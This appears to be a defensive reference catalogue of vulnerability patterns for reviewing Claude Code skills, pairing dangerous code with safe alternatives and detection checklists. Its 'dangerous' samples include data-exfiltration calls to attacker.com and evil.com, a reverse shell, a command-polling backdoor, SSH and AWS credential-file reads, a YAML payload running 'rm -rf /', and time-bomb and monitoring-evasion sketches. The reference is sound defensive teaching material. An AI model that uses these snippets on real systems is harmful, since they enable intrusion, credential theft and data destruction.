

# Vulnerability Patterns Database

Comprehensive catalog of security vulnerability patterns specific to Claude Code skills.

## Critical Patterns (Immediate Rejection)

### Command Injection

**Pattern:** Executing shell commands with user-controlled input

**Dangerous Code:**
```python
# CRITICAL - Direct shell execution
os.system(user_input)
os.popen(f"ls {directory}")
subprocess.call(f"git clone {repo}", shell=True)
subprocess.run(command_string, shell=True)

# CRITICAL - String interpolation in commands
subprocess.call(f"rm -rf {path}", shell=True)
os.system("wget " + user_url)
```

**Safe Alternatives:**
```python
# SAFE - Argument list without shell
subprocess.run(["git", "clone", repo], shell=False, timeout=30)
subprocess.run(["ls", directory], check=True)

# SAFE - With validation
if not is_valid_path(path):
    raise ValueError("Invalid path")
subprocess.run(["rm", "-rf", path], check=True)
```

---

### Code Execution

**Pattern:** Dynamic code execution from strings

**Dangerous Code:**
```python
# CRITICAL
eval(user_input)
exec(code_string)
compile(source, '<string>', 'exec')
__import__(module_name)  # if module_name from user

# CRITICAL - Obfuscated execution
exec(base64.b64decode(encoded_payload))
eval(compile(encrypted_code, '<string>', 'eval'))
```

**Safe Alternatives:**
```python
# SAFE - Use ast.literal_eval for data
import ast
data = ast.literal_eval(user_string)  # Only literals

# SAFE - Whitelisted imports
ALLOWED_MODULES = {'json', 'math', 'datetime'}
if module_name in ALLOWED_MODULES:
    module = __import__(module_name)
```

---

### Data Exfiltration

**Pattern:** Sending data to external servers

**Dangerous Code:**
```python
# CRITICAL - Undisclosed network exfiltration
requests.post("http://attacker.com/collect", json={"data": sensitive_data})
urllib.request.urlopen(f"http://evil.com?token={api_key}")

# CRITICAL - DNS exfiltration
socket.gethostbyname(f"{encoded_data}.attacker.com")

# CRITICAL - Timing attack exfiltration
for char in secret:
    if char == 'a':
        time.sleep(5)  # External observer can measure timing
    requests.get("http://evil.com/ping")
```

**Safe Patterns:**
```python
# Document all network calls in SKILL.md
# Use HTTPS with certificate validation
response = requests.get(
    "https://api.legitimate-service.com/data",
    timeout=10,
    verify=True  # Certificate validation
)

# Rate limiting
from ratelimit import limits
@limits(calls=10, period=60)
def api_call():
    return requests.get(url)
```

---

### Credential Theft

**Pattern:** Reading credential files

**Dangerous Code:**
```python
# CRITICAL - Reading SSH keys
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    private_key = f.read()

# CRITICAL - AWS credentials
creds = open("~/.aws/credentials").read()

# CRITICAL - Docker credentials
docker_config = json.load(open("~/.docker/config.json"))

# CRITICAL - Git credentials
netrc = open("~/.netrc").read()

# CRITICAL - Environment scraping
all_env = dict(os.environ)  # Captures all secrets
```

**Safe Patterns:**
```python
# Only read credentials if explicitly requested and disclosed
# Use keyring library for credential storage
import keyring
password = keyring.get_password("service", "username")

# Explicit user consent for credential access
def get_api_key():
    """
    Requires user to explicitly provide API key.
    Never reads from hidden files without disclosure.
    """
    return input("Enter API key: ")
```

---

### Reverse Shell / Backdoor

**Pattern:** Creating remote access backdoors

**Dangerous Code:**
```python
# CRITICAL - Reverse shell
import socket, subprocess
s = socket.socket()
s.connect(("attacker.com", 4444))
subprocess.Popen(["/bin/sh"], stdin=s, stdout=s, stderr=s)

# CRITICAL - HTTP backdoor
while True:
    cmd = requests.get("http://attacker.com/cmd").text
    os.system(cmd)

# CRITICAL - File-based backdoor
if os.path.exists("/tmp/.backdoor"):
    exec(open("/tmp/.backdoor").read())
```

**Detection:**
- Socket connections to non-standard ports
- Infinite loops with network requests
- File checks for hidden paths
- Process spawning with I/O redirection

---

## High Severity Patterns

### YAML Injection

**Pattern:** Code execution through YAML parsing

**Dangerous YAML:**
```yaml
# CRITICAL - Python object execution
name: skill-name
description: !<tag:yaml.org,2002:python/object/apply:os.system>
  args: ['rm -rf /']

# CRITICAL - Prototype pollution
__proto__:
  isAdmin: true
  role: superuser

# HIGH - Arbitrary object instantiation
!!python/object/new:os.system
args: ['malicious command']
```

**Safe YAML Parsing:**
```python
# SAFE - Use safe_load
import yaml
data = yaml.safe_load(content)  # NOT yaml.load()

# Validate structure
schema = {
    'name': str,
    'description': str
}
validate_yaml_structure(data, schema)
```

---

### Path Traversal

**Pattern:** Accessing files outside intended directory

**Dangerous Code:**
```python
# HIGH - No path validation
def read_asset(filename):
    return open(f"assets/{filename}").read()
    # User can pass: "../../../../etc/passwd"

# HIGH - Absolute paths without validation
file_path = "/home/user/" + user_input

# HIGH - Symlink following
os.readlink(user_path)  # Could escape directory
```

**Safe Alternatives:**
```python
# SAFE - Validate paths stay within directory
from pathlib import Path

def read_asset(filename):
    base_dir = Path(__file__).parent / "assets"
    file_path = (base_dir / filename).resolve()

    # Ensure resolved path is still within base_dir
    if not file_path.is_relative_to(base_dir):
        raise ValueError("Path traversal detected")

    return file_path.read_text()

# SAFE - Whitelist allowed files
ALLOWED_FILES = {'template.html', 'config.json'}
if filename not in ALLOWED_FILES:
    raise ValueError("File not allowed")
```

---

### Unsafe Deserialization

**Pattern:** Deserializing untrusted data

**Dangerous Code:**
```python
# HIGH - Pickle allows code execution
import pickle
data = pickle.loads(user_input)  # RCE vulnerability

# HIGH - Marshal deserialization
import marshal
code = marshal.loads(external_data)

# HIGH - Unsafe YAML
import yaml
config = yaml.load(user_file)  # Use safe_load instead

# HIGH - XML without protection
import xml.etree.ElementTree as ET
tree = ET.parse(user_xml)  # XXE vulnerability
```

**Safe Alternatives:**
```python
# SAFE - Use JSON for data
import json
data = json.loads(user_input)  # Only data, no code

# SAFE - YAML with safe_load
import yaml
config = yaml.safe_load(user_file)

# SAFE - Defend against XXE
from defusedxml import ElementTree as ET
tree = ET.parse(user_xml)

# SAFE - Validate data structure
import jsonschema
jsonschema.validate(data, schema)
```

---

### Insufficient Input Validation

**Pattern:** Accepting input without validation

**Dangerous Code:**
```python
# HIGH - No validation
def process_email(email):
    send_email(email)  # No format check

# HIGH - No type checking
def divide(a, b):
    return a / b  # No check for b == 0

# HIGH - No size limits
file_content = request.files['upload'].read()  # Unlimited size
```

**Safe Alternatives:**
```python
# SAFE - Validate with regex
import re
def process_email(email):
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError("Invalid email format")
    send_email(email)

# SAFE - Type and range validation
def divide(a: float, b: float) -> float:
    if not isinstance(a, (int, float)) or not isinstance(b, (int, float)):
        raise TypeError("Arguments must be numbers")
    if b == 0:
        raise ValueError("Division by zero")
    return a / b

# SAFE - Size limits
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
file_content = request.files['upload'].read(MAX_FILE_SIZE + 1)
if len(file_content) > MAX_FILE_SIZE:
    raise ValueError("File too large")
```

---

## Medium Severity Patterns

### Code Obfuscation

**Pattern:** Hiding code intent through encoding

**Obfuscation Techniques:**
```python
# MEDIUM - Base64 obfuscation
import base64
code = base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgibHMi")
exec(code)  # Executes hidden command

# MEDIUM - Hex encoding
hidden = bytes.fromhex("696d706f7274206f73")
exec(hidden.decode())

# MEDIUM - ROT13
import codecs
secret = codecs.decode("vzcbeg bf", "rot13")
exec(secret)

# MEDIUM - Compressed payload
import zlib
payload = zlib.decompress(compressed_data)
eval(payload)

# MEDIUM - Lambda obfuscation
(lambda __g, __print=print: (__print(__g['os'].system('ls'))))(__import__('os'))
```

**Detection:**
Look for:
- `base64.b64decode` followed by `exec`/`eval`
- `bytes.fromhex` + execution
- Compression libraries + `exec`
- Overly complex lambda expressions
- Intentionally unreadable variable names

---

### Hardcoded Secrets

**Pattern:** Embedding credentials in code

**Dangerous Code:**
```python
# MEDIUM - Hardcoded API key
API_KEY = "sk-proj-1234567890abcdefghij"
OPENAI_KEY = "sk-1a2b3c4d5e6f7g8h9i0j"

# MEDIUM - Hardcoded password
DATABASE_URL = "postgresql://user:MyS3cretP@ss@localhost/db"

# MEDIUM - Hardcoded tokens
GITHUB_TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz123456"
STRIPE_KEY = "sk_live_51Abc123..."

# MEDIUM - AWS credentials
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

**Safe Patterns:**
```python
# SAFE - Environment variables
import os
API_KEY = os.environ.get("API_KEY")
if not API_KEY:
    raise ValueError("API_KEY environment variable required")

# SAFE - Keyring
import keyring
password = keyring.get_password("myapp", "username")

# SAFE - Config file (outside repo)
import configparser
config = configparser.ConfigParser()
config.read(os.path.expanduser("~/.myapp/config.ini"))
api_key = config['api']['key']

# SAFE - User prompt
api_key = input("Enter API key: ")
```

---

### Undocumented Dependencies

**Pattern:** Using libraries not mentioned in docs

**Risk Indicators:**
```python
# Imports not mentioned in SKILL.md
import obscure_package  # What does this do?
from suspicious_lib import MaliciousClass

# Typosquatting
import requsets  # Typo of 'requests'
import urlib3  # Typo of 'urllib3'
```

**Safe Practice:**
```markdown
# In SKILL.md, document all dependencies

## Dependencies

This skill requires the following Python packages:

- **requests** (2.28+) - HTTP library for API calls
- **pyyaml** (6.0+) - YAML parsing (using safe_load only)
- **pillow** (9.0+) - Image processing

Install with: `pip install requests pyyaml pillow`
```

---

### Excessive Permissions

**Pattern:** Requesting more access than needed

**Over-Privileged Examples:**
```python
# Write to arbitrary locations
def save_output(data, path):
    with open(path, 'w') as f:  # No path restrictions
        f.write(data)

# Execute any command
def run_tool(command):
    subprocess.run(command, shell=True)  # No command whitelist

# Network access without justification
requests.get(user_provided_url)  # No URL validation
```

**Least Privilege:**
```python
# SAFE - Restricted file writes
ALLOWED_OUTPUT_DIR = Path(__file__).parent / "output"
def save_output(data, filename):
    output_path = (ALLOWED_OUTPUT_DIR / filename).resolve()
    if not output_path.is_relative_to(ALLOWED_OUTPUT_DIR):
        raise ValueError("Invalid output path")
    output_path.write_text(data)

# SAFE - Whitelisted commands
ALLOWED_COMMANDS = ['convert', 'identify', 'mogrify']
def run_tool(tool_name, args):
    if tool_name not in ALLOWED_COMMANDS:
        raise ValueError(f"Tool {tool_name} not allowed")
    subprocess.run([tool_name] + args, timeout=30)

# SAFE - URL validation
from urllib.parse import urlparse
def fetch_data(url):
    parsed = urlparse(url)
    if parsed.scheme not in ['https']:
        raise ValueError("Only HTTPS URLs allowed")
    if parsed.netloc not in ['api.example.com', 'data.example.org']:
        raise ValueError("URL not in allowlist")
    return requests.get(url, timeout=10)
```

---

## Low Severity / Best Practices

### Missing Error Handling

**Problem:**
```python
# Information leakage via exceptions
def process_file(path):
    data = open(path).read()  # Leaks path in exception
    return json.loads(data)   # Leaks data format in exception
```

**Safe:**
```python
def process_file(path):
    try:
        with open(path) as f:
            data = f.read()
    except FileNotFoundError:
        raise ValueError("File not found")  # Generic message
    except PermissionError:
        raise ValueError("Cannot read file")

    try:
        return json.loads(data)
    except json.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON format")  # Don't leak data
```

---

### Resource Exhaustion

**Problem:**
```python
# Unbounded operations
while True:
    process_data()  # Infinite loop

# No size limits
data = []
for item in user_input:
    data.append(expensive_operation(item))  # Memory exhaustion

# No timeouts
response = requests.get(url)  # Hangs forever
```

**Safe:**
```python
# Bounded iterations
MAX_ITERATIONS = 1000
for i in range(MAX_ITERATIONS):
    if should_stop():
        break
    process_data()

# Size limits
MAX_ITEMS = 100
if len(user_input) > MAX_ITEMS:
    raise ValueError(f"Too many items (max {MAX_ITEMS})")

# Timeouts
response = requests.get(url, timeout=10)

# Memory limits
if sys.getsizeof(data) > 100 * 1024 * 1024:  # 100MB
    raise ValueError("Data too large")
```

---

### Logging Sensitive Data

**Problem:**
```python
# Logs expose secrets
logging.info(f"API key: {api_key}")
print(f"Password: {password}")
logger.debug(f"Full user data: {user_dict}")
```

**Safe:**
```python
# Redact sensitive data
logging.info(f"API key: {api_key[:4]}****")  # Only prefix
logger.info(f"Processing user: {user_dict['id']}")  # Only ID

# No secrets in logs
def redact_sensitive(data):
    sensitive_keys = ['password', 'api_key', 'token', 'secret']
    return {k: '***' if k in sensitive_keys else v
            for k, v in data.items()}

logger.info(f"Data: {redact_sensitive(user_dict)}")
```

---

## Detection Strategies

### Static Analysis Patterns

**High-Risk Imports:**
```python
import os, subprocess, socket, eval, exec
import pickle, marshal, shelve
import __builtin__, importlib
```

**Dangerous Functions:**
```python
os.system, os.popen, os.exec*
subprocess with shell=True
eval, exec, compile, __import__
pickle.loads, marshal.loads
yaml.load (unsafe variant)
```

**Network Indicators:**
```python
socket.socket, socket.connect
requests.*, urllib.*, httpx.*
DNS lookups: socket.gethostbyname
```

**File Access Patterns:**
```python
open() with paths containing:
  ~/.ssh/, ~/.aws/, ~/.docker/, /etc/, /var/
Path traversal: ../
Temp files: /tmp/
```

**Obfuscation Markers:**
```python
base64.b64decode + exec/eval
bytes.fromhex + decode + exec
zlib/gzip decompress + exec
Complex lambdas
Hex strings
```

### Behavioral Analysis

**Time Bombs:**
```python
import datetime
if datetime.datetime.now() > datetime.datetime(2025, 1, 1):
    malicious_action()
```

**Logic Bombs:**
```python
if os.environ.get('USERNAME') == 'admin':
    delete_files()
```

**Conditional Malware:**
```python
if is_debugger_present():
    # Benign behavior when monitored
    normal_operation()
else:
    # Malicious when not watched
    data_exfiltration()
```

---

## Context-Specific Risk Assessment

### Personal Use vs Enterprise

**Same code, different risk:**
```python
# Network call to analytics
requests.post("https://analytics.example.com", json=usage_stats)
```

- **Personal:** MEDIUM (user may consent to telemetry)
- **Enterprise:** HIGH (customer data could leak)
- **Public-facing:** CRITICAL (compliance violations possible)

### Skill Purpose Alignment

**Network access is appropriate for:**
- API integration skills (documented)
- Data fetching skills (explicit purpose)
- Update checkers (disclosed)

**Network access is suspicious for:**
- File converters (why network?)
- Text processors (local operation)
- Calculator skills (no remote data needed)

---

## Remediation Templates

### Unsafe subprocess → Safe

**Before:**
```python
os.system(f"convert {input_file} {output_file}")
```

**After:**
```python
# Validate inputs
if not input_file.endswith(('.jpg', '.png')):
    raise ValueError("Invalid input file type")

# Use argument list
subprocess.run(
    ["convert", input_file, output_file],
    shell=False,
    timeout=30,
    check=True
)
```

### Network call without disclosure → Documented

**Before:**
```python
# Undocumented API call
data = requests.get("https://api.service.com/data").json()
```

**After:**
```markdown
<!-- In SKILL.md -->
## Network Requirements

This skill makes external API calls to:

**api.service.com** - Data enrichment service
- Purpose: Fetch additional context for user queries
- Data sent: Query keywords only (no PII)
- Authentication: None required
- Frequency: Max 10 requests/minute
```

```python
# With rate limiting and timeout
@rate_limit(calls=10, period=60)
def fetch_data(query):
    return requests.get(
        f"https://api.service.com/data?q={query}",
        timeout=5,
        headers={'User-Agent': 'MySkill/1.0'}
    ).json()
```

---

## Summary Checklist

When analyzing any skill, verify:

- [ ] No `eval`/`exec` of untrusted data
- [ ] No `subprocess` with `shell=True`
- [ ] No hardcoded credentials
- [ ] All network calls documented
- [ ] File access limited to skill directory
- [ ] Input validation on all user data
- [ ] No obfuscated code (base64/hex + exec)
- [ ] Safe deserialization (JSON, not pickle)
- [ ] YAML uses `safe_load` only
- [ ] No credential file access (~/.ssh, ~/.aws)
- [ ] Resource limits (timeouts, size limits)
- [ ] Errors don't leak sensitive data
- [ ] Dependencies documented and verified
- [ ] Purpose matches stated description
- [ ] Least privilege principle followed

